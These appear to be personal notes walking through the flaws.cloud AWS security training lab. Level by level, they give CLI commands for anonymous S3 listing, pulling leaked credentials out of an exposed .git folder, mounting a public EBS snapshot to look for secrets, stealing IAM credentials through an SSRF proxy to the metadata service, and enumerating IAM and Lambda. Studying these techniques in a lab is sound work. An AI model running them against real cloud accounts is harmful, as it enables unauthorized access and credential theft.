1.) Getting region and type of instance
  - Use DNS entries: dig +short flaws.cloud
  - query nameserver to get DNS information that gives up the type and region: nslookup IP-FROM-DIG
  
2.) Querying s3 instances
  - You can use the API: (aws s3 ls s3://flaws.cloud/ --no-sign-request --region <region found from dns entry>)
    + --no-sign-request: Disables signing requests - creds wont be loaded

3.) Look for creds in buckets (left in .git/ quite often)
  - If have read & list access I could view the .git/ if there is one.
  - (aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --recursive)
  - To get the git information: (aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git ./git --recursive)
  - Once I have credentials I can create a profile with them: (aws configure --profile flaws)
  - Then view all their buckets: (aws --profile flaws s3 ls)
  
4.) Use key to get user information
  - Get user info: (aws --profile flaws sts get-caller-identity)
  - Is snapshot open to everyone?: (aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE>)
  - If CreateVolumePemissions has Group: all, then yes we can create a volume out of the snapshot
  - Get snapshots from user id: (aws --profile flaws ec2 describe-snapshots --owner-id 975426262029 --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE>)

5.) Use key to get public snapshot
  - Create volume from public snapshot: (aws ec2 create-volume --availability-zone <ZONE> --region <REGION-HERE-IF_NOT-IN-CRED-PROFILE> --snapshot-id snap-0b49342abd1bdcb89)
  - Attach volume to instance: (aws ec2 attach-volume --volume-id vol-0b5715a658be546c5 --instance-id i-058ad74f95e9d9050 --device /dev/sdf)
  - SSH in and take a look at the volume (find important files/pwds/keys/src)
  
6.) Get metadata through HTTP proxy on ec2 instance
  - AWS has a running instance for metadata at the webserver here: http://169.254.169.254/
  - Use the proxy to request this metadata service to grab security credentials: (http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/)
  - Use these creds to access buckets you were not supposed to access!
  
7.) Using the SecurityAudit group can show lots of information
  - Get user information: (aws --profile lvl6 iam get-user)
  - Get user policies: (aws --profile lvl6 iam list-attached-user-policies --user-name Level6)
  - Get information about a policy: (aws --profile lvl6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit)
  - If a policy allows you to list api enpoints you can query different functions that could give off information.
  - List lambda functions (aws --profile lvl6 lambda list-functions)
  - Query lambda informations (aws --profile lvl6 lambda get-policy --function-name Level6)
  - View information of a lambda (aws --profile lvl6 apigateway get-stages --rest-api-id "s33ppypa75")
